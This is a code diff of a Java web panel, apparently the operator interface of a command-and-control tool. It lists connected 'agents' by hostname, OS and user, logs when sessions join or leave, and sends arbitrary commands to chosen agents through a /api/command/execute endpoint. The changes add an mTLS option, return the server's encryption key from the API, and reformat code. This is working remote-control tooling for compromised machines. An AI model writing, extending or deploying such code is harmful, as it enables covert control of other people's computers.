@@ -1,14 +1,13 @@
 package com.tomcat.iface;
 
 import com.google.gson.Gson;
+import com.sun.net.httpserver.*;
 import com.tomcat.core.event.EventManager;
 import com.tomcat.core.event.EventManager.EventType;
 import com.tomcat.core.output.Logger;
 import com.tomcat.core.server.TomcatServer;
 import com.tomcat.core.session.Session;
 import com.tomcat.utils.ServerConfig;
-
-import com.sun.net.httpserver.*;
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
@@ -18,26 +17,27 @@ import java.util.*;
 import java.util.concurrent.*;
 
 public class WebApp {
-    private final ServerConfig Config;
-    private TomcatServer       Server;
-    private HttpServer         HttpSrv;
-    private Instant            ServerStartTime;
-    private final List<String> Logs    = new CopyOnWriteArrayList<>();
-    private final int          MaxLogs;
-    private final Gson         GsonInst = new Gson();
-    private final Path         BaseDir;
 
-    public WebApp(ServerConfig Config) {
-        this.Config  = Config;
+    private final ServerConfig Config;
+    private final boolean UseMtls;
+    private TomcatServer Server;
+    private HttpServer HttpSrv;
+    private Instant ServerStartTime;
+    private final List<String> Logs = new CopyOnWriteArrayList<>();
+    private final int MaxLogs;
+    private final Gson GsonInst = new Gson();
+    private final Path BaseDir;
+
+    public WebApp(ServerConfig Config, boolean UseMtls) {
+        this.Config = Config;
+        this.UseMtls = UseMtls;
         this.MaxLogs = Config.GetMaxLogEntries();
         this.BaseDir = ResolveBaseDir();
     }
 
     private Path ResolveBaseDir() {
         try {
-            Path JarPath = Paths.get(
-                WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI()
-            );
+            Path JarPath = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI());
             Path Parent = JarPath.getParent();
             if (Parent != null && Files.isDirectory(Parent)) {
                 return Parent.toAbsolutePath();
@@ -73,17 +73,19 @@ public class WebApp {
 
     private void SetupRoutes() {
         HttpSrv.createContext("/", new StaticHandler());
-        HttpSrv.createContext("/api/server/status",    Exc -> HandleRequest(Exc, this::ApiServerStatus));
-        HttpSrv.createContext("/api/server/start",     Exc -> HandleRequest(Exc, this::ApiServerStart));
-        HttpSrv.createContext("/api/server/stop",      Exc -> HandleRequest(Exc, this::ApiServerStop));
-        HttpSrv.createContext("/api/agents",           Exc -> HandleRequest(Exc, this::ApiGetAgents));
-        HttpSrv.createContext("/api/logs",             Exc -> HandleRequest(Exc, this::ApiGetLogs));
-        HttpSrv.createContext("/api/logs/clear",       Exc -> HandleRequest(Exc, this::ApiClearLogs));
-        HttpSrv.createContext("/api/command/execute",  Exc -> HandleRequest(Exc, this::ApiExecuteCommand));
+        HttpSrv.createContext("/api/server/status", Exc -> HandleRequest(Exc, this::ApiServerStatus));
+        HttpSrv.createContext("/api/server/start", Exc -> HandleRequest(Exc, this::ApiServerStart));
+        HttpSrv.createContext("/api/server/stop", Exc -> HandleRequest(Exc, this::ApiServerStop));
+        HttpSrv.createContext("/api/agents", Exc -> HandleRequest(Exc, this::ApiGetAgents));
+        HttpSrv.createContext("/api/logs", Exc -> HandleRequest(Exc, this::ApiGetLogs));
+        HttpSrv.createContext("/api/logs/clear", Exc -> HandleRequest(Exc, this::ApiClearLogs));
+        HttpSrv.createContext("/api/command/execute", Exc -> HandleRequest(Exc, this::ApiExecuteCommand));
     }
 
     @FunctionalInterface
-    interface RequestHandler { String Handle(HttpExchange E) throws Exception; }
+    interface RequestHandler {
+        String Handle(HttpExchange E) throws Exception;
+    }
 
     private void HandleRequest(HttpExchange E, RequestHandler Handler) {
         try {
@@ -96,15 +98,19 @@ public class WebApp {
                 return;
             }
             String Response = Handler.Handle(E);
-            byte[] Bytes    = Response.getBytes("UTF-8");
+            byte[] Bytes = Response.getBytes("UTF-8");
             E.sendResponseHeaders(200, Bytes.length);
-            try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+            try (OutputStream Os = E.getResponseBody()) {
+                Os.write(Bytes);
+            }
         } catch (Exception Ex) {
             try {
-                String Err   = GsonInst.toJson(Map.of("Error", Ex.getMessage()));
+                String Err = GsonInst.toJson(Map.of("Error", Ex.getMessage()));
                 byte[] Bytes = Err.getBytes("UTF-8");
                 E.sendResponseHeaders(500, Bytes.length);
-                try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+                try (OutputStream Os = E.getResponseBody()) {
+                    Os.write(Bytes);
+                }
             } catch (IOException Ignored) {}
         }
     }
@@ -112,25 +118,27 @@ public class WebApp {
     private String ApiServerStatus(HttpExchange E) {
         if (Server != null && Server.IsRunning()) {
             Map<String, Object> Resp = new LinkedHashMap<>();
-            Resp.put("Status",    "Online");
-            Resp.put("Host",      Server.GetHost());
-            Resp.put("Port",      Server.GetPort());
+            Resp.put("Status", "Online");
+            Resp.put("Host", Server.GetHost());
+            Resp.put("Port", Server.GetPort());
             Resp.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
-            Resp.put("Uptime",    GetUptime());
-            Resp.put("Agents",    Server.GetSessions().Count());
-            Resp.put("Key",       new String(Server.GetCrypto().GetKey()));
+            Resp.put("Uptime", GetUptime());
+            Resp.put("Agents", Server.GetSessions().Count());
+            Resp.put("Key", java.util.Base64.getEncoder().encodeToString(Server.GetCrypto().GetKey()));
+            Resp.put("MtlsEnabled", UseMtls);
             return GsonInst.toJson(Resp);
         }
-        return GsonInst.toJson(Map.of("Status", "Offline", "Agents", 0));
+        return GsonInst.toJson(Map.of("Status", "Offline", "Agents", 0, "MtlsEnabled", UseMtls));
     }
 
     private String ApiServerStart(HttpExchange E) throws Exception {
-        if (Server != null && Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Server Already Running"));
+        if (Server != null && Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Server Already Running")
+        );
         Map<String, Object> Body = ParseBody(E);
-        String  Host = Body.getOrDefault("Host", Config.GetServerHost()).toString();
-        int     Port = (int) Double.parseDouble(Body.getOrDefault("Port", Config.GetServerPort()).toString());
-        boolean Mtls = Config.IsMtlsEnabled();
+        String Host = Body.getOrDefault("Host", Config.GetServerHost()).toString();
+        int Port = (int) Double.parseDouble(Body.getOrDefault("Port", Config.GetServerPort()).toString());
+        boolean Mtls = this.UseMtls;
         Server = new TomcatServer(Host, Port, Mtls, Config);
         Server.AddEventListener(this::EventHandler);
         boolean[] Result = Server.StartServer();
@@ -145,42 +153,42 @@ public class WebApp {
         AccThread.setDaemon(true);
         AccThread.start();
         Map<String, Object> Resp = new LinkedHashMap<>();
-        Resp.put("Success",   true);
-        Resp.put("Message",   "Server started on " + Host + ":" + Port);
-        Resp.put("Host",      Host);
-        Resp.put("Port",      Port);
+        Resp.put("Success", true);
+        Resp.put("Message", "Server started on " + Host + ":" + Port);
+        Resp.put("Host", Host);
+        Resp.put("Port", Port);
         Resp.put("StartedAt", ServerStartTime.getEpochSecond());
-        Resp.put("Key",       new String(Server.GetCrypto().GetKey()));
+        Resp.put("Key", new String(Server.GetCrypto().GetKey()));
         return GsonInst.toJson(Resp);
     }
 
     private String ApiServerStop(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Server not running"));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Server not running")
+        );
         Server.StopServer();
-        Server          = null;
+        Server = null;
         ServerStartTime = null;
         AddLog("[!] Server Stopped");
         return GsonInst.toJson(Map.of("Success", true, "Message", "Server Stopped"));
     }
 
     private String ApiGetAgents(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
         List<Map<String, Object>> Agents = new ArrayList<>();
         for (Session S : Server.GetSessions().GetAll()) {
             Map<String, Object> A = new LinkedHashMap<>();
-            A.put("ID",         S.GetId());
-            A.put("Address",    S.GetRemoteAddress());
-            A.put("OS",         S.GetOs());
-            A.put("Hostname",   S.GetHostname());
-            A.put("User",       S.GetUser());
-            A.put("Arch",       S.GetArch());
-            A.put("AgentIP",    S.GetAgentIp());
-            A.put("AgentName",  S.GetAgentName());
-            A.put("JoinedAt",   S.GetJoinedAt());
-            A.put("Type",       S.GetSessionType().name());
-            A.put("ShellMode",  S.GetShellMode());
+            A.put("ID", S.GetId());
+            A.put("Address", S.GetRemoteAddress());
+            A.put("OS", S.GetOs());
+            A.put("Hostname", S.GetHostname());
+            A.put("User", S.GetUser());
+            A.put("Arch", S.GetArch());
+            A.put("AgentIP", S.GetAgentIp());
+            A.put("AgentName", S.GetAgentName());
+            A.put("JoinedAt", S.GetJoinedAt());
+            A.put("Type", S.GetSessionType().name());
+            A.put("ShellMode", S.GetShellMode());
             Agents.add(A);
         }
         return GsonInst.toJson(Map.of("Agents", Agents));
@@ -196,30 +204,39 @@ public class WebApp {
     }
 
     private String ApiExecuteCommand(HttpExchange E) throws Exception {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
-        Map<String, Object> Body    = ParseBody(E);
-        int    AgentId = (int) Double.parseDouble(Body.getOrDefault("AgentId", 0).toString());
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Server not running")
+        );
+        Map<String, Object> Body = ParseBody(E);
+        int AgentId = (int) Double.parseDouble(Body.getOrDefault("AgentId", 0).toString());
         String Command = Body.getOrDefault("Command", "").toString();
-        if (AgentId == 0 || Command.isEmpty())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Missing AgentId or Command"));
+        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Missing AgentId or Command")
+        );
         AddLog("[>] Agent " + AgentId + " | Executing: " + Command);
         String[] Result = Server.ExecuteCommand(AgentId, Command);
-        boolean  Ok     = Boolean.parseBoolean(Result[0]);
+        boolean Ok = Boolean.parseBoolean(Result[0]);
         if (Ok) AddLog("[+] Output:\n" + Result[1]);
-        else    AddLog("[!] Error: " + Result[1]);
+        else AddLog("[!] Error: " + Result[1]);
         return GsonInst.toJson(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
     }
 
     private void EventHandler(EventType Type, Map<String, Object> Data) {
         switch (Type) {
-            case AgentConnected    -> AddLog(String.format(
-                "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
-                Data.get("Type"), Data.get("ID"), Data.get("Hostname"),
-                Data.get("OS"), Data.get("User")));
+            case AgentConnected -> AddLog(
+                String.format(
+                    "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
+                    Data.get("Type"),
+                    Data.get("ID"),
+                    Data.get("Hostname"),
+                    Data.get("OS"),
+                    Data.get("User")
+                )
+            );
             case AgentDisconnected -> AddLog(
-                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason"));
-            case Error             -> AddLog("[!] " + Data.get("Message"));
+                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason")
+            );
+            case Error -> AddLog("[!] " + Data.get("Message"));
         }
     }
 
@@ -244,6 +261,7 @@ public class WebApp {
     }
 
     class StaticHandler implements HttpHandler {
+
         @Override
         public void handle(HttpExchange E) throws IOException {
             String ReqPath = E.getRequestURI().getPath();
@@ -269,7 +287,9 @@ public class WebApp {
             if (Target == null) {
                 byte[] Resp = ("404 Not Found: " + ReqPath).getBytes();
                 E.sendResponseHeaders(404, Resp.length);
-                try (OutputStream Os = E.getResponseBody()) { Os.write(Resp); }
+                try (OutputStream Os = E.getResponseBody()) {
+                    Os.write(Resp);
+                }
                 return;
             }
 
@@ -277,16 +297,18 @@ public class WebApp {
             E.getResponseHeaders().add("Content-Type", ContentType);
             byte[] Data = Files.readAllBytes(Target);
             E.sendResponseHeaders(200, Data.length);
-            try (OutputStream Os = E.getResponseBody()) { Os.write(Data); }
+            try (OutputStream Os = E.getResponseBody()) {
+                Os.write(Data);
+            }
         }
 
         private String GetContentType(String Path) {
             if (Path.endsWith(".html")) return "text/html; charset=UTF-8";
-            if (Path.endsWith(".css"))  return "text/css";
-            if (Path.endsWith(".js"))   return "application/javascript";
+            if (Path.endsWith(".css")) return "text/css";
+            if (Path.endsWith(".js")) return "application/javascript";
             if (Path.endsWith(".json")) return "application/json";
-            if (Path.endsWith(".png"))  return "image/png";
-            if (Path.endsWith(".ico"))  return "image/x-icon";
+            if (Path.endsWith(".png")) return "image/png";
+            if (Path.endsWith(".ico")) return "image/x-icon";
             return "application/octet-stream";
         }
     }
